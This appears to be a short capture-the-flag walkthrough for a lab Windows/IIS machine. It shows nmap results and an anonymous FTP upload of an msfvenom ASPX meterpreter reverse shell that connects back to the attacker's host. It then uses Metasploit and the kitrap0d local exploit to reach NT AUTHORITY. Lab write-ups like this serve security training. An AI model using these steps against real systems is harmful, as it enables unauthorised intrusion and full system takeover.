# Recon
```
└─$ nmap -sC -sV 10.10.10.5
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-01 19:27 EEST
Stats: 0:00:48 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 91.30% done; ETC: 19:28 (0:00:04 remaining)
Stats: 0:01:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.23% done; ETC: 19:29 (0:00:00 remaining)
Nmap scan report for 10.10.10.5
Host is up (1.6s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
| 08-01-23  10:36AM                 2909 reversesh.aspx
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.62 seconds
```
- we try to access ftp
- username: anonymous password: **just press enter** and we got acces to the server listing the server there are .aspx so asp.net can be attack vector
- we the put command to uplaod something to the server and yes we can
- we can try to upload asp webshell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=444 -f aspx > devel.aspx
```
- go to msfconsole run
- use multi/handler
- set payload set payload payload/windows/meterpreter/reverse_tcp
- go to 10.10.10.5/devel.aspx
- go back to metasploit and we got a shell as Server username: IIS APPPOOL\Web
# privilage escalation
- Navigating to c:\windows\TEMP as large portion of Metasploit’s Windows privilege escalation modules require a file to be written to the target during exploitation
- sysinfo we know that machine is x86
- run local_exploit_suggester -> run post/multi/recon/local_exploit_suggester
- gave us some to try, now background the session
- ```
  use exploit/windows/local/ms10_015_kitrap0d
  ```
  
- set session to one and exploit and we get shell as nt authority

